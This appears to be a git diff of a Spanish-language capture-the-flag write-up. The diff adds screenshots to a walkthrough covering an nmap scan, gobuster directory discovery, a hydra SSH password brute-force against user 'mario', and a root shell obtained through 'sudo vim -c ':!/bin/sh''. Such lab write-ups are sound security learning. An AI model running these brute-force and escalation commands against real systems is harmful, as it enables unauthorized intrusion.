@@ -42,9 +42,14 @@ Se confirmó que el objetivo responde a la red.
 nmap -sV -sC -p- 172.18.0.2 --open -oN scanPuertos.txt
 \`\`\`
 
+![escaneo](screenshots/escaneo.PNG)
+
 Detectamos los puertos abiertos:
 - Puerto 22 (SSH)
 - Puerto 80 (HTTP)
+Vemos que tiene el puerto 80 mediante el navegador
+
+![navegador](screenshots/puerto80http.PNG)
 
 ---
 
@@ -56,11 +61,15 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://172.18.0.2 -x php
 
 Se descubrió el archivo \`secret.php\`.
 
+![gobuster](screenshots/gobuster.PNG)
+
 ---
 
 ### 4. Análisis del archivo \`secret.php\`
 
 Al visitar \`http://172.18.0.2/secret.php\` encontramos un nombre: **Mario**.
+
+![Nombre](screenshots/mario.PNG)
 
 ---
 
@@ -74,11 +83,15 @@ hydra -l mario -P /usr/share/wordlists/rockyou.txt -v ssh://172.18.0.2
 
 Se logró obtener la contraseña correcta.
 
+![Password](screenshots/contraseña.PNG)
+
 ---
 
 ### 6. Acceso vía SSH
 
 Conectamos exitosamente a la máquina como usuario \`mario\`.
+
+![SHH](screenshots/conexionSSH.PNG)
 
 ---
 
@@ -92,17 +105,25 @@ sudo -l
 
 Se observó que \`mario\` puede ejecutar \`vim\` con privilegios de root sin contraseña.
 
+![escala](screenshots/escalada.PNG)
+
 ---
 
 ### 8. Explotación para obtener shell root
 
 Usando la técnica encontrada en [GTFOBins - Vim](https://gtfobins.github.io/), ejecutamos:
 
+![escalada](screenshots/escaladavim.PNG)
+
 \`\`\`bash
 sudo vim -c ':!/bin/sh'
 \`\`\`
 
+![accesoRoot](screenshots/accesoRoot.PNG)
+
 Conseguimos un shell con privilegios root y control total de la máquina.
+
+![Root](screenshots/root.PNG)
 
 ---
 
